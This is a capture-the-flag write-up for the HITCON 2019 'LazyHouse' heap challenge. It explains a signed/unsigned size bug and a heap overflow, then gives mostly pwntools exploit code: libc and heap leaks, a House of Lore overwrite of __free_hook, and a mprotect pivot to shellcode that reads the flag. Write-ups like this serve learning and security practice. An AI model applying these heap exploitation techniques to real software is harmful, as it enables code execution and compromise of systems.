# HITCON 2019 Quals LazyHouse Writeup

## Description

My teammate, Lays, wants a house. Can you buy one for him?
flag: `/home/lazyhouse/flag`

`nc 3.115.121.123 5731`

## Analysis

The problem is just a simple **menu heap challenge**, with some **seccomp rules**. (like `execve` being blocked) In this challenge, we can allocate, free, print chunks, as well as **two chances of modification + 32 byte overflow, and 1 malloc chance**.

The allocation of chunk needs size and money, where size is bigger than `0x7f`, and money is bigger than `218*size`. The allocation uses calloc to get chunk, so it doesn't use tcache in allocation. Moreover, the number of entries in chunk list is 8, so we can get 8 different chunks in maximum.

Freeing chunks refunds money of `size*64`, and it deletes chunk from the bss list, so it's impossible to free same chunk multiple times.

We can print chunks with `write` function if the chunk is in the house list. Also, we have 2 chances to upgrade house, which allows us to modify content of chunk + 32 bytes of heap overflow. We can also allocate chunk with size `0x220`, with malloc once.

## Bug

There is a bug in buying house, which allows us to **buy houses with negative size**. In buying house, it compares unsigned size with signed `0x7f`, so we can give size with negative value. However, we need to ensure that `218*size` is lesser than our money, since it performs unsigned comparison.

Also, there is an intended bug in upgrading house, which allows us to do **32 byte heap overflow** twice.

## Scenario

### Money cheat

Because unsigned size value we give in buying house is compared with signed `0x7f`, we can give negative size to buy house, and sell it to increase our money. So we can make our money super large by buying house with proper size, and selling it.

```python
# money cheat
polluted_size = -(((219 << 64) / 218) % (1 << 64))
r.sendlineafter("choice: ", "1")
r.sendlineafter("Index:", "0")
r.sendlineafter("Size:", str(polluted_size))
r.interactive()
sell_house(0)
```

### Libc and tcache struct address leak by chunk overlapping 2

By using chunk overlapping 2 ([Link](https://github.com/shellphish/how2heap/blob/master/glibc_2.25/overlapping_chunks_2.c)), we can leak libc and heap address. Two chunks are overlapped for later processes.

```python
# filling tcaches
for i in xrange(7):
  buy_house(0, 0x88, "Z")
  sell_house(0)
for i in xrange(7):
  buy_house(0, 0x98, "Z")
  sell_house(0)
for i in xrange(7):
  buy_house(0, 0x1f8, "Z")
  sell_house(0)

buy_house(0, 0x88, "A")
buy_house(1, 0x98, "B")
buy_house(2, 0x418, "C") # chunk to be overlapped
buy_house(3, 0x418, "D") # chunk to be overlapped
buy_house(4, 0x98, "E")
buy_house(5, 0x88, "F") # chunk to block coalescing

sell_house(4)
upgrade_house(0, "G"*0x88+p64(0xa0+0x420+0x420+1))
sell_house(1)

# leak libc address
buy_house(1, 0x98, "H") # size is 0x98 to write arena address in 2

libc_leak = u64(show_house(2)[0:8])
log.success("libc leak addr : "+hex(libc_leak))

libc_base = libc_leak - 0x7fb657832ca0 + 0x7fb65764e000
free_hook = libc_base + libc.symbols['__free_hook']
system = libc_base + libc.symbols['system']

# cleanup
sell_house(5)
sell_house(1)
sell_house(0)

# leak heap address
payload = "K"*(0x90+0xa0-8)
payload += p64(0x31) # fake size 0x31 (2nd entry of tcache entries)
payload += "L"*0x418
payload += p64(0x21) # fake size 0x21 (1st entry of tcache entries)
payload += "L"*0x18
payload += p64(0x401)
buy_house(4, 0x90+0xa0+0x420+0x420-8, payload)

# free two chunks to put them in tcache struct
sell_house(2) # to 0x31 entry
sell_house(3) # to 0x21 entry

# leak tcache struct addr (actually tcache key in 2.29)
heap_leak = u64(show_house(4)[0x138:0x140])
log.success("heap leak addr : "+hex(heap_leak))
chunk_base = heap_leak-0x10
```

### House of Lore to overwrite free hook

In tcache struct, tcache count list and tcache entries are adjacent. Because of that, we can create fake chunk structure in tcache struct, by putting 1st and 2nd tcache entry by freeing chunks size `0x20` and `0x30`, and fake size (in this case, `0x301`)by freeing chunks size `0x3a0` and `0x3b0`. After house of lore, tcache entries will be overwritten, so that we can do arbitrary write by buying super house.

```python
# house of lore
buy_house(4, 0x90+0xa0+0x420-8+0x10, "M")
buy_house(5, 0x1f8, "N")
buy_house(6, 0x1f8, "O")

sell_house(5)
buy_house(5, 0x4b8, "P")

payload = "Q"*(0x90+0xa0-8+0x10)
payload += p64(0x421) # restore chunk size
payload += p64(chunk_base+0x40) # fake chunk 2
payload += "R"*0x410
payload += p64(0x201) # for checking (looks like size)
payload += p64(libc_leak-96+592) # fake chunk 1
payload += p64(chunk_base+0x40) # fake chunk 1
upgrade_house(4, payload)

buy_house(1, 0x1f8, "S")

# pre process for super size house
buy_house(0, 0x217, "PLUS")
sell_house(0)

# fake size in tcache struct (0x301)
buy_house(0, 0x398, "Z")
sell_house(0)
for i in xrange(3):
  buy_house(0, 0x3a8, "Z")
  sell_house(0)

# overwrite tcache entries
target = free_hook
log.info ("target: " + hex(target))
payload = ""
payload += "/bin/sh\0"+p64(target)*17*2 
buy_house(0, 0x1f8, payload)
```

### call mprotect and run shellcode

Overwrite `__free_hook` to call mprotect, then run shellcode.

```python
xchg_gadget = libc_base + 0x0000000000158023
call_mprotect = libc_base + 0x0000000000117590
how_gadget = libc_base + 0x00000000001080fc
push_rdi_ret = libc_base + 0x000000000004c745
log.info ("b * {}".format (hex(how_gadget)))
ss = p64(how_gadget)
buy_super_house(ss)

pay = p64(call_mprotect) + p64(heap_leak + 0x4ff0) 
context.arch = 'amd64'
context.os = 'linux'

sc = asm(shellcraft.amd64.open ("/home/lazyhouse/flag", 0))
sc += asm(shellcraft.amd64.read ('rax', 'rsp', 100))
sc += asm(shellcraft.amd64.write (1, 'rsp', 100))
pay2 = p64(heap_leak+0x4220) + "\x90" * 0x20 + sc
print len (pay2)
buy_house (2, 0x850, "ASDF")
buy_house (7, 0x200, pay)
buy_house (3, 0x200, pay2)

r.sendafter("choice: ", "3".ljust(0x20, "b"))
r.sendafter("Index:", "7".ljust(32,"a"))
#sell_house(0)
sell_house (3)
r.interactive()
```

### Full code

[Link]([https://github.com/candymate/pwn/blob/master/HITCON%202019%20Quals/solver.py](https://github.com/candymate/pwn/blob/master/HITCON 2019 Quals/solver.py))

